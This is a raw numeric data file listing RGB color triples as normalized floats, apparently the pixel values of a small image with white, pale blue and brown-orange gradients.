{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.949,0.918,0.925},{0.925,0.839,0.804},{0.925,0.82,0.769},{0.925,0.816,0.741},{0.929,0.804,0.722},{0.937,0.804,0.706},{0.933,0.804,0.698},{0.929,0.796,0.686},{0.933,0.792,0.671},{0.933,0.788,0.659},{0.922,0.788,0.616},{0.976,0.914,0.475},{0.937,0.882,0.631},{0.851,0.796,0.788},{0.824,0.757,0.714},{0.8,0.686,0.62},{0.784,0.643,0.557},{0.769,0.624,0.514},{0.761,0.612,0.49},{0.757,0.584,0.459},{0.753,0.573,0.447},{0.757,0.573,0.455},{0.761,0.569,0.439},{0.745,0.557,0.424},{0.729,0.541,0.404},{0.71,0.522,0.38},{0.686,0.478,0.345},{0.675,0.471,0.333},{0.651,0.455,0.31},{0.627,0.431,0.286},{0.616,0.412,0.259},{0.596,0.392,0.239},{0.588,0.361,0.216},{0.588,0.345,0.204},{0.573,0.341,0.196},{0.573,0.325,0.176},{0.58,0.329,0.165},{0.569,0.318,0.141},{0.565,0.314,0.125},
{0.565,0.306,0.082},{0.569,0.302,0.071},{0.549,0.282,0.035},{0.49,0.216,0.012},{0.384,0.106,0.004},{0.255,0.059,0.008},{0.318,0.114,0.016},{0.706,0.514,0.094},{0.961,0.816,0.231},{0.98,0.878,0.322},{0.98,0.831,0.247},{0.941,0.741,0.118},{0.863,0.584,0.043},{0.827,0.506,0.024},{0.843,0.557,0.086},{0.929,0.725,0.133},{0.98,0.835,0.216},{0.992,0.875,0.263},{0.988,0.89,0.306},{0.988,0.89,0.318},{0.98,0.875,0.337},{0.961,0.839,0.282},{0.949,0.824,0.267},{0.937,0.796,0.22},{0.906,0.765,0.176},{0.886,0.729,0.149},{0.867,0.702,0.125},{0.827,0.655,0.078},{0.941,0.976,1},{0.941,0.976,1},{0.961,0.976,0.996},{0.965,0.976,0.996},{0.969,0.984,1},{0.969,0.984,1},{0.969,0.984,0.996},{0.973,0.988,1},{0.976,0.992,0.996},{0.976,0.992,0.996},{0.984,0.992,0.996},{0.988,0.992,1},{0.992,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},
{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.961,0.933,0.937},{0.918,0.831,0.804},{0.925,0.82,0.773},{0.929,0.816,0.749},{0.929,0.808,0.718},{0.929,0.8,0.694},{0.925,0.8,0.686},{0.925,0.788,0.671},{0.929,0.78,0.647},{0.914,0.773,0.608},{0.973,0.886,0.522},{0.973,0.91,0.561},{0.875,0.816,0.788},{0.824,0.769,0.737},{0.788,0.694,0.624},{0.776,0.639,0.541},{0.753,0.592,0.486},{0.753,0.584,0.463},{0.757,0.592,0.459},{0.757,0.58,0.443},{0.757,0.569,0.439},{0.769,0.584,0.463},{0.761,0.565,0.435},{0.753,0.561,0.427},{0.722,0.537,0.396},{0.71,0.525,0.384},{0.694,0.494,0.353},{0.671,0.467,0.329},{0.639,0.447,0.302},{0.62,0.42,0.271},{0.604,0.396,0.243},{0.592,0.384,0.231},{0.584,0.345,0.208},{0.592,0.345,0.208},{0.584,0.345,0.2},{0.576,0.325,0.176},{0.565,0.31,0.145},{0.561,0.31,0.133},{0.565,0.314,0.125},{0.569,0.31,0.09},{0.569,0.298,0.075},{0.557,0.286,0.047},{0.51,0.235,0.016},{0.443,0.149,0.008},{0.325,0.075,0.004},
{0.243,0.043,0.004},{0.267,0.067,0.008},{0.584,0.392,0.075},{0.925,0.773,0.212},{0.992,0.882,0.337},{0.976,0.871,0.322},{0.945,0.804,0.212},{0.906,0.702,0.09},{0.835,0.518,0.024},{0.749,0.357,0.008},{0.761,0.408,0.016},{0.843,0.553,0.051},{0.918,0.698,0.094},{0.969,0.808,0.173},{0.992,0.863,0.239},{0.992,0.878,0.263},{0.988,0.882,0.306},{0.984,0.875,0.31},{0.973,0.859,0.302},{0.957,0.831,0.271},{0.937,0.804,0.255},{0.91,0.773,0.192},{0.937,0.973,1},{0.937,0.973,1},{0.953,0.969,1},{0.961,0.98,1},{0.969,0.98,1},{0.969,0.98,1},{0.969,0.984,1},{0.973,0.988,1},{0.973,0.988,0.996},{0.976,0.992,0.996},{0.984,0.992,0.996},{0.988,0.992,1},{0.992,0.996,1},{0.992,0.996,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},
{1,1,1},{1,1,1},{0.973,0.953,0.953},{0.918,0.835,0.812},{0.925,0.824,0.78},{0.925,0.816,0.757},{0.929,0.808,0.714},{0.922,0.792,0.678},{0.925,0.784,0.667},{0.918,0.776,0.647},{0.918,0.776,0.631},{0.945,0.839,0.565},{0.984,0.945,0.498},{0.906,0.851,0.733},{0.824,0.749,0.737},{0.749,0.627,0.549},{0.737,0.592,0.482},{0.718,0.553,0.424},{0.733,0.557,0.427},{0.737,0.561,0.427},{0.753,0.569,0.427},{0.765,0.58,0.435},{0.757,0.565,0.424},{0.765,0.569,0.439},{0.753,0.557,0.42},{0.753,0.557,0.42},{0.733,0.541,0.404},{0.702,0.525,0.384},{0.686,0.502,0.357},{0.675,0.478,0.337},{0.643,0.451,0.306},{0.635,0.431,0.286},{0.62,0.4,0.251},{0.612,0.392,0.247},{0.6,0.373,0.235},{0.596,0.357,0.212},{0.6,0.345,0.196},{0.584,0.329,0.18},{0.569,0.314,0.153},{0.557,0.306,0.129},{0.561,0.306,0.129},{0.576,0.314,0.102},{0.565,0.294,0.078},{0.561,0.29,0.063},{0.522,0.247,0.02},{0.471,0.173,0.012},{0.388,0.102,0.004},{0.294,0.071,0.004},{0.251,0.051,0.004},{0.282,0.071,0.004},{0.525,0.333,0.051},{0.875,0.722,0.192},{0.98,0.859,0.29},
{0.996,0.886,0.345},{0.969,0.847,0.306},{0.937,0.773,0.196},{0.886,0.663,0.071},{0.827,0.518,0.008},{0.749,0.357,0.004},{0.733,0.373,0.004},{0.82,0.518,0.008},{0.851,0.627,0.02},{0.894,0.702,0.059},{0.945,0.765,0.141},{0.98,0.824,0.204},{0.992,0.863,0.263},{0.984,0.882,0.294},{0.988,0.882,0.329},{0.961,0.851,0.29},{0.937,0.973,1},{0.937,0.973,1},{0.949,0.969,1},{0.961,0.98,1},{0.965,0.98,0.996},{0.969,0.98,1},{0.969,0.984,1},{0.973,0.988,1},{0.976,0.992,1},{0.976,0.992,0.996},{0.984,0.992,0.996},{0.988,0.992,1},{0.992,0.996,1},{0.992,0.996,1},{0.992,1,1},{1,1,1},{0.992,1,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.988,0.984,0.98},{0.914,0.847,0.82},{0.929,0.827,0.78},{0.929,0.816,0.757},
{0.933,0.816,0.718},{0.925,0.796,0.675},{0.918,0.776,0.647},{0.918,0.773,0.627},{0.925,0.808,0.592},{0.992,0.937,0.525},{0.969,0.914,0.616},{0.831,0.753,0.725},{0.737,0.608,0.522},{0.694,0.49,0.373},{0.686,0.471,0.333},{0.702,0.49,0.357},{0.718,0.51,0.376},{0.741,0.537,0.404},{0.745,0.553,0.416},{0.761,0.565,0.427},{0.761,0.573,0.431},{0.776,0.584,0.451},{0.757,0.557,0.424},{0.749,0.549,0.416},{0.725,0.537,0.4},{0.694,0.518,0.376},{0.682,0.506,0.373},{0.675,0.486,0.353},{0.667,0.475,0.329},{0.651,0.447,0.302},{0.643,0.424,0.278},{0.616,0.396,0.251},{0.616,0.388,0.251},{0.604,0.361,0.216},{0.6,0.345,0.196},{0.576,0.322,0.173},{0.557,0.302,0.137},{0.561,0.31,0.133},{0.565,0.31,0.133},{0.569,0.306,0.094},{0.561,0.29,0.078},{0.549,0.275,0.051},{0.533,0.255,0.024},{0.486,0.188,0.016},{0.416,0.118,0.004},{0.353,0.082,0.004},{0.302,0.067,0.004},{0.286,0.067,0.008},{0.31,0.09,0.012},{0.459,0.243,0.024},{0.82,0.631,0.18},{0.937,0.804,0.227},{0.992,0.878,0.337},{0.992,0.89,0.361},{0.953,0.831,0.298},{0.902,0.718,0.118},{0.863,0.604,0.024},
{0.796,0.463,0.004},{0.737,0.345,0.004},{0.776,0.431,0.008},{0.843,0.569,0.016},{0.847,0.584,0.008},{0.824,0.553,0.012},{0.875,0.624,0.059},{0.929,0.722,0.125},{0.976,0.812,0.192},{0.992,0.859,0.259},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.953,0.98,0.996},{0.965,0.98,0.996},{0.969,0.984,1},{0.969,0.984,1},{0.973,0.988,1},{0.976,0.992,0.996},{0.976,0.992,0.996},{0.984,0.992,0.996},{0.984,0.988,0.996},{0.988,0.992,1},{0.992,0.996,1},{0.992,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.925,0.882,0.871},{0.933,0.824,0.788},{0.922,0.812,0.749},{0.929,0.808,0.718},{0.925,0.792,0.671},{0.937,0.776,0.647},{0.906,0.765,0.616},{0.969,0.906,0.553},{0.988,0.945,0.541},
{0.867,0.792,0.702},{0.745,0.604,0.522},{0.694,0.494,0.361},{0.698,0.439,0.302},{0.651,0.388,0.243},{0.694,0.447,0.302},{0.714,0.49,0.341},{0.749,0.541,0.388},{0.741,0.545,0.404},{0.761,0.569,0.427},{0.761,0.565,0.427},{0.769,0.569,0.431},{0.765,0.565,0.427},{0.733,0.561,0.424},{0.714,0.533,0.404},{0.706,0.525,0.384},{0.694,0.506,0.361},{0.682,0.478,0.337},{0.675,0.475,0.329},{0.663,0.459,0.314},{0.647,0.431,0.282},{0.643,0.412,0.271},{0.62,0.384,0.239},{0.608,0.361,0.216},{0.6,0.349,0.2},{0.588,0.325,0.184},{0.565,0.302,0.145},{0.557,0.29,0.133},{0.565,0.314,0.125},{0.573,0.31,0.106},{0.549,0.271,0.071},{0.537,0.259,0.043},{0.533,0.255,0.027},{0.486,0.2,0.016},{0.427,0.137,0.004},{0.376,0.102,0.004},{0.341,0.082,0.004},{0.322,0.082,0.004},{0.333,0.098,0.004},{0.353,0.118,0.004},{0.435,0.204,0.012},{0.737,0.541,0.114},{0.945,0.796,0.216},{0.992,0.878,0.318},{1,0.898,0.353},{0.98,0.855,0.333},{0.894,0.737,0.153},{0.878,0.667,0.051},{0.847,0.561,0.016},{0.757,0.396,0.008},{0.741,0.361,0.004},{0.816,0.518,0.008},{0.867,0.624,0.02},
{0.843,0.58,0.012},{0.808,0.506,0.004},{0.8,0.49,0.008},{0.843,0.58,0.039},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.976,1},{0.949,0.976,0.992},{0.965,0.984,1},{0.965,0.984,1},{0.969,0.984,1},{0.969,0.984,0.996},{0.973,0.988,0.996},{0.976,0.992,0.996},{0.984,0.992,0.996},{0.984,0.988,0.996},{0.988,0.992,1},{0.992,0.996,1},{0.992,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.949,0.929,0.929},{0.922,0.824,0.808},{0.925,0.812,0.761},{0.922,0.8,0.714},{0.914,0.784,0.671},{0.918,0.769,0.643},{0.929,0.827,0.561},{0.996,0.961,0.533},{0.925,0.847,0.686},{0.765,0.643,0.608},{0.725,0.51,0.412},{0.694,0.431,0.302},{0.675,0.38,0.251},{0.655,0.373,0.231},{0.682,0.424,0.278},
{0.714,0.478,0.333},{0.745,0.529,0.38},{0.757,0.561,0.416},{0.761,0.565,0.424},{0.765,0.569,0.431},{0.753,0.561,0.424},{0.749,0.569,0.427},{0.749,0.573,0.431},{0.722,0.537,0.404},{0.714,0.518,0.369},{0.71,0.51,0.365},{0.694,0.478,0.337},{0.678,0.463,0.325},{0.675,0.459,0.322},{0.647,0.431,0.282},{0.647,0.412,0.271},{0.624,0.388,0.243},{0.604,0.357,0.216},{0.6,0.349,0.2},{0.584,0.318,0.176},{0.576,0.31,0.157},{0.557,0.29,0.137},{0.561,0.294,0.11},{0.565,0.286,0.09},{0.533,0.255,0.055},{0.525,0.251,0.035},{0.537,0.251,0.024},{0.494,0.208,0.02},{0.447,0.157,0.004},{0.408,0.122,0.004},{0.373,0.098,0.004},{0.365,0.11,0.004},{0.376,0.133,0.004},{0.388,0.149,0.004},{0.412,0.169,0.016},{0.443,0.208,0.008},{0.69,0.49,0.102},{0.933,0.796,0.235},{0.988,0.878,0.333},{0.988,0.91,0.38},{0.965,0.871,0.345},{0.918,0.765,0.192},{0.843,0.667,0.039},{0.839,0.592,0.008},{0.804,0.478,0.004},{0.714,0.333,0.004},{0.776,0.439,0.008},{0.859,0.604,0.027},{0.878,0.659,0.047},{0.843,0.58,0.027},{0.78,0.439,0.008},{0.937,0.973,1},{0.937,0.973,1},
{0.937,0.973,1},{0.945,0.973,0.992},{0.961,0.98,0.996},{0.965,0.98,0.996},{0.969,0.984,0.996},{0.976,0.992,1},{0.973,0.988,0.996},{0.976,0.992,1},{0.984,0.992,0.996},{0.984,0.992,0.996},{0.988,0.992,1},{0.996,1,1},{0.996,1,1},{0.996,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.98,0.98,0.98},{0.914,0.835,0.831},{0.918,0.816,0.765},{0.922,0.796,0.714},{0.918,0.784,0.671},{0.906,0.769,0.627},{0.945,0.863,0.573},{0.914,0.827,0.573},{0.725,0.58,0.506},{0.725,0.525,0.439},{0.725,0.463,0.361},{0.69,0.408,0.275},{0.675,0.384,0.259},{0.675,0.376,0.235},{0.698,0.427,0.29},{0.737,0.486,0.345},{0.749,0.525,0.376},{0.769,0.573,0.427},{0.765,0.576,0.435},{0.765,0.576,0.447},{0.753,0.569,0.435},
{0.749,0.58,0.435},{0.745,0.561,0.42},{0.749,0.553,0.412},{0.733,0.525,0.376},{0.722,0.51,0.365},{0.71,0.49,0.349},{0.682,0.463,0.322},{0.671,0.451,0.31},{0.651,0.431,0.286},{0.643,0.404,0.263},{0.624,0.38,0.239},{0.612,0.357,0.22},{0.608,0.353,0.204},{0.592,0.329,0.18},{0.58,0.314,0.153},{0.561,0.294,0.133},{0.561,0.29,0.106},{0.569,0.29,0.094},{0.525,0.243,0.047},{0.518,0.235,0.027},{0.518,0.231,0.012},{0.494,0.216,0.02},{0.459,0.169,0.004},{0.427,0.133,0.004},{0.4,0.122,0.004},{0.396,0.129,0.004},{0.412,0.153,0.004},{0.431,0.18,0.004},{0.447,0.196,0.008},{0.455,0.212,0.031},{0.475,0.239,0.024},{0.671,0.486,0.102},{0.949,0.808,0.259},{0.988,0.886,0.314},{0.992,0.906,0.384},{0.98,0.878,0.373},{0.918,0.788,0.239},{0.863,0.659,0.082},{0.839,0.604,0.004},{0.816,0.525,0.004},{0.745,0.361,0.008},{0.737,0.361,0.004},{0.824,0.569,0.024},{0.867,0.694,0.055},{0.851,0.651,0.047},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.941,0.973,1},{0.957,0.976,0.992},{0.965,0.984,0.996},{0.969,0.984,1},{0.973,0.988,1},
{0.973,0.988,1},{0.976,0.992,1},{0.976,0.992,1},{0.976,0.992,0.996},{0.988,0.992,1},{0.992,0.996,1},{0.992,0.996,1},{0.996,0.996,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,1,1},{0.933,0.886,0.89},{0.906,0.82,0.776},{0.918,0.8,0.729},{0.859,0.698,0.631},{0.725,0.51,0.451},{0.58,0.29,0.204},{0.514,0.208,0.129},{0.514,0.227,0.169},{0.675,0.42,0.333},{0.737,0.467,0.345},{0.718,0.427,0.298},{0.718,0.431,0.302},{0.702,0.404,0.251},{0.714,0.451,0.31},{0.753,0.514,0.369},{0.761,0.541,0.392},{0.769,0.576,0.431},{0.757,0.584,0.439},{0.761,0.584,0.455},{0.769,0.596,0.459},{0.757,0.58,0.427},{0.757,0.565,0.424},{0.753,0.557,0.416},{0.737,0.525,0.376},{0.729,0.522,0.365},{0.718,0.506,0.357},
{0.69,0.471,0.325},{0.678,0.459,0.314},{0.655,0.431,0.286},{0.639,0.396,0.255},{0.639,0.38,0.243},{0.624,0.365,0.224},{0.6,0.345,0.188},{0.592,0.337,0.176},{0.588,0.325,0.149},{0.561,0.298,0.122},{0.557,0.286,0.102},{0.545,0.278,0.075},{0.525,0.243,0.051},{0.529,0.227,0.031},{0.514,0.224,0.016},{0.482,0.216,0.012},{0.459,0.18,0.008},{0.439,0.157,0.004},{0.435,0.145,0.004},{0.447,0.153,0.004},{0.447,0.184,0.008},{0.475,0.216,0.012},{0.498,0.247,0.024},{0.498,0.251,0.035},{0.51,0.278,0.059},{0.541,0.329,0.082},{0.71,0.518,0.149},{0.941,0.792,0.275},{0.992,0.878,0.318},{0.996,0.898,0.38},{0.988,0.886,0.369},{0.941,0.8,0.255},{0.863,0.675,0.094},{0.839,0.6,0.012},{0.827,0.545,0.008},{0.753,0.384,0.004},{0.702,0.306,0.004},{0.788,0.486,0.008},{0.867,0.671,0.067},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.937,0.973,1},{0.941,0.98,0.988},{0.953,0.988,0.996},{0.969,0.984,0.996},{0.969,0.984,0.996},{0.969,0.984,0.996},{0.973,0.988,1},{0.976,0.992,1},{0.976,0.992,0.996},{0.988,0.992,1},{0.988,0.992,1},
{0.992,0.996,1},{0.992,0.996,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.992,0.992,0.992},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,0.996},{0.973,0.957,0.961},{0.898,0.827,0.8},{0.894,0.776,0.729},{0.788,0.576,0.561},{0.718,0.435,0.392},{0.612,0.267,0.212},{0.494,0.137,0.082},{0.455,0.106,0.063},{0.659,0.357,0.271},{0.757,0.463,0.341},{0.737,0.443,0.318},{0.714,0.431,0.302},{0.733,0.435,0.282},{0.753,0.498,0.357},{0.773,0.545,0.408},{0.773,0.561,0.42},{0.773,0.58,0.435},{0.773,0.596,0.447},{0.773,0.6,0.459},{0.769,0.596,0.455},{0.773,0.584,0.435},{0.788,0.584,0.443},{0.757,0.561,0.42},{0.741,0.529,0.38},{0.729,0.522,0.365},{0.729,0.518,0.365},{0.71,0.49,0.345},{0.678,0.459,0.314},{0.675,0.451,0.306},{0.655,0.408,0.271},{0.643,0.384,0.247},{0.627,0.369,0.227},
{0.608,0.349,0.196},{0.596,0.341,0.184},{0.596,0.333,0.157},{0.573,0.31,0.133},{0.561,0.294,0.11},{0.537,0.263,0.063},{0.522,0.239,0.047},{0.522,0.224,0.027},{0.51,0.22,0.024},{0.482,0.216,0.027},{0.463,0.188,0.004},{0.451,0.173,0.004},{0.455,0.18,0.008},{0.467,0.196,0.008},{0.486,0.227,0.016},{0.51,0.255,0.027},{0.545,0.29,0.059},{0.533,0.29,0.071},{0.557,0.325,0.11},{0.584,0.373,0.153},{0.592,0.384,0.157},{0.698,0.506,0.192},{0.922,0.765,0.278},{0.98,0.882,0.329},{0.984,0.898,0.365},{0.992,0.886,0.373},{0.937,0.808,0.275},{0.859,0.686,0.098},{0.827,0.612,0.031},{0.812,0.541,0.004},{0.769,0.431,0.008},{0.678,0.247,0.012},{0.757,0.408,0.008},{0.933,0.969,1},{0.933,0.969,1},{0.937,0.973,1},{0.941,0.973,1},{0.937,0.98,1},{0.953,0.98,1},{0.969,0.98,1},{0.969,0.98,1},{0.969,0.984,0.996},{0.973,0.988,1},{0.976,0.992,0.996},{0.976,0.992,0.996},{0.984,0.992,0.996},{0.988,0.992,1},{0.992,0.996,1},{0.992,0.996,1},{0.992,0.996,1},{1,1,1},{1,1,1},{1,1,1},
{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,0.992},{1,0.996,0.996},{0.918,0.859,0.847},{0.886,0.776,0.745},{0.816,0.608,0.612},{0.753,0.486,0.439},{0.678,0.306,0.251},{0.576,0.157,0.098},{0.518,0.118,0.063},{0.71,0.416,0.322},{0.78,0.514,0.4},{0.761,0.49,0.365},{0.753,0.478,0.345},{0.761,0.486,0.353},{0.769,0.525,0.384},{0.788,0.58,0.435},{0.784,0.592,0.447},{0.773,0.596,0.447},{0.78,0.6,0.455},{0.784,0.6,0.459},{0.788,0.6,0.459},{0.78,0.584,0.439},{0.784,0.588,0.443},{0.765,0.569,0.424},{0.745,0.545,0.404},{0.749,0.537,0.404},{0.729,0.51,0.365},{0.706,0.494,0.345},{0.675,0.459,0.31},{0.682,0.447,0.302},{0.659,0.424,0.271},{0.643,0.4,0.247},{0.631,0.369,0.224},{0.616,0.357,0.2},{0.592,0.337,0.18},{0.588,0.325,0.157},{0.573,0.314,0.129},{0.573,0.298,0.106},{0.541,0.267,0.075},
{0.525,0.247,0.055},{0.51,0.227,0.035},{0.49,0.216,0.024},{0.478,0.2,0.027},{0.467,0.188,0.012},{0.459,0.18,0.004},{0.475,0.2,0.012},{0.494,0.231,0.016},{0.525,0.275,0.039},{0.545,0.294,0.063},{0.557,0.318,0.078},{0.569,0.345,0.114},{0.596,0.38,0.145},{0.612,0.408,0.18},{0.624,0.427,0.2},{0.62,0.42,0.192},{0.69,0.514,0.216},{0.902,0.761,0.278},{0.984,0.886,0.341},{1,0.898,0.38},{0.988,0.886,0.357},{0.929,0.8,0.247},{0.871,0.694,0.122},{0.816,0.588,0.012},{0.824,0.573,0.004},{0.784,0.447,0.008},{0.647,0.231,0.004},{0.933,0.969,1},{0.933,0.969,1},{0.937,0.973,1},{0.941,0.973,1},{0.937,0.976,1},{0.953,0.98,0.996},{0.965,0.976,0.996},{0.969,0.98,1},{0.969,0.984,1},{0.969,0.984,0.996},{0.976,0.992,0.996},{0.976,0.992,0.996},{0.984,0.988,0.996},{0.988,0.992,1},{0.988,0.992,1},{0.988,0.992,1},{0.992,0.996,1},{0.996,0.996,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},
{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,0.996},{0.992,0.988,0.976},{0.941,0.902,0.859},{0.894,0.816,0.792},{0.835,0.643,0.62},{0.812,0.541,0.494},{0.725,0.357,0.29},{0.678,0.267,0.212},{0.631,0.259,0.204},{0.792,0.541,0.447},{0.816,0.561,0.455},{0.761,0.498,0.38},{0.773,0.518,0.38},{0.78,0.533,0.392},{0.78,0.553,0.408},{0.804,0.608,0.463},{0.788,0.608,0.459},{0.792,0.616,0.478},{0.792,0.612,0.475},{0.8,0.616,0.475},{0.792,0.6,0.459},{0.788,0.592,0.447},{0.796,0.6,0.455},{0.765,0.569,0.424},{0.765,0.565,0.424},{0.745,0.533,0.396},{0.737,0.518,0.373},{0.71,0.498,0.349},{0.675,0.459,0.31},{0.675,0.439,0.294},{0.659,0.424,0.271},{0.639,0.396,0.243},{0.639,0.376,0.227},{0.612,0.353,0.196},{0.6,0.341,0.184},{0.584,0.322,0.153},{0.58,0.322,0.137},{0.569,0.294,0.102},{0.541,0.267,0.075},{0.525,0.247,0.055},{0.506,0.227,0.035},{0.49,0.212,0.024},{0.478,0.2,0.027},{0.467,0.188,0.008},{0.463,0.184,0.008},
{0.49,0.212,0.016},{0.51,0.247,0.031},{0.561,0.306,0.075},{0.588,0.333,0.106},{0.592,0.353,0.118},{0.6,0.38,0.149},{0.635,0.42,0.188},{0.635,0.427,0.212},{0.643,0.439,0.227},{0.647,0.447,0.231},{0.643,0.435,0.231},{0.694,0.498,0.22},{0.929,0.78,0.302},{0.996,0.882,0.341},{0.992,0.898,0.38},{0.98,0.886,0.365},{0.925,0.8,0.267},{0.855,0.678,0.106},{0.824,0.608,0.02},{0.824,0.573,0.004},{0.784,0.451,0.008},{0.933,0.969,1},{0.933,0.969,1},{0.937,0.973,1},{0.941,0.973,1},{0.937,0.976,1},{0.953,0.976,1},{0.961,0.973,1},{0.969,0.98,1},{0.969,0.984,1},{0.969,0.984,0.996},{0.969,0.984,0.996},{0.976,0.992,0.996},{0.98,0.992,0.996},{0.984,0.996,1},{0.988,0.992,1},{0.988,0.992,1},{0.992,0.996,1},{0.992,0.996,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},
{1,1,1},{1,1,1},{1,1,0.996},{0.984,0.976,0.957},{0.933,0.906,0.847},{0.922,0.886,0.875},{0.902,0.804,0.631},{0.827,0.62,0.486},{0.788,0.478,0.412},{0.761,0.431,0.369},{0.8,0.506,0.451},{0.851,0.631,0.541},{0.855,0.62,0.522},{0.776,0.537,0.424},{0.8,0.557,0.424},{0.804,0.569,0.424},{0.82,0.604,0.463},{0.812,0.627,0.482},{0.812,0.643,0.502},{0.812,0.631,0.498},{0.812,0.631,0.498},{0.82,0.643,0.506},{0.812,0.624,0.494},{0.796,0.604,0.471},{0.792,0.596,0.455},{0.784,0.588,0.443},{0.765,0.565,0.424},{0.757,0.549,0.412},{0.737,0.525,0.376},{0.71,0.494,0.345},{0.686,0.471,0.318},{0.682,0.451,0.306},{0.667,0.427,0.278},{0.655,0.408,0.255},{0.627,0.373,0.224},{0.62,0.357,0.2},{0.6,0.349,0.18},{0.584,0.322,0.149},{0.565,0.306,0.118},{0.557,0.29,0.094},{0.553,0.267,0.078},{0.529,0.251,0.063},{0.51,0.227,0.039},{0.486,0.212,0.02},{0.478,0.2,0.027},{0.463,0.184,0.008},{0.467,0.192,0.008},{0.51,0.231,0.027},{0.541,0.278,0.059},{0.576,0.329,0.102},{0.604,0.361,0.133},{0.608,0.38,0.141},{0.62,0.408,0.176},
{0.647,0.439,0.22},{0.655,0.459,0.243},{0.659,0.463,0.255},{0.663,0.471,0.263},{0.671,0.467,0.263},{0.671,0.467,0.255},{0.737,0.545,0.255},{0.933,0.796,0.306},{0.996,0.882,0.361},{0.992,0.898,0.376},{0.976,0.878,0.365},{0.941,0.808,0.255},{0.867,0.706,0.133},{0.835,0.62,0.039},{0.827,0.565,0.004},{0.933,0.969,1},{0.933,0.969,1},{0.937,0.973,1},{0.941,0.973,1},{0.937,0.976,1},{0.949,0.976,1},{0.961,0.973,1},{0.969,0.98,1},{0.973,0.988,1},{0.969,0.984,0.996},{0.969,0.984,0.996},{0.976,0.992,1},{0.976,0.992,1},{0.98,0.996,1},{0.988,0.992,1},{0.992,0.996,1},{0.992,0.996,1},{0.992,0.996,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{0.996,0.996,0.996},{1,1,1},{1,1,1},{1,1,1},{1,1,1},{1,1,0.992},{0.976,0.957,0.937},{0.941,0.918,0.859},{0.941,0.922,0.886},
{0.98,0.953,0.647},{0.996,0.98,0.627},{0.953,0.859,0.643},{0.851,0.675,0.631},{0.898,0.694,0.631},{0.894,0.69,0.612},{0.871,0.667,0.573},{0.827,0.616,0.506},{0.824,0.6,0.467},{0.831,0.616,0.478},{0.835,0.635,0.502},{0.824,0.643,0.518},{0.82,0.655,0.529},{0.824,0.651,0.522},{0.824,0.655,0.529},{0.831,0.659,0.537},{0.816,0.635,0.518},{0.804,0.62,0.494},{0.792,0.596,0.463},{0.784,0.588,0.443},{0.757,0.561,0.42},{0.757,0.549,0.412},{0.722,0.514,0.361},{0.714,0.498,0.345},{0.698,0.482,0.329},{0.686,0.463,0.314},{0.675,0.435,0.286},{0.655,0.404,0.251},{0.631,0.376,0.227},{0.62,0.365,0.2},{0.604,0.353,0.176},{0.588,0.325,0.149},{0.573,0.314,0.122},{0.557,0.286,0.09},{0.541,0.247,0.063},{0.529,0.251,0.059},{0.514,0.231,0.043},{0.498,0.22,0.031},{0.478,0.2,0.027},{0.471,0.192,0.024},{0.482,0.208,0.02},{0.522,0.247,0.043},{0.553,0.302,0.082},{0.6,0.357,0.137},{0.612,0.38,0.153},{0.612,0.396,0.165},{0.627,0.427,0.2},{0.651,0.451,0.235},{0.671,0.482,0.259},{0.675,0.49,0.275},{0.686,0.502,0.29},{0.694,0.506,0.298},{0.694,0.506,0.298},
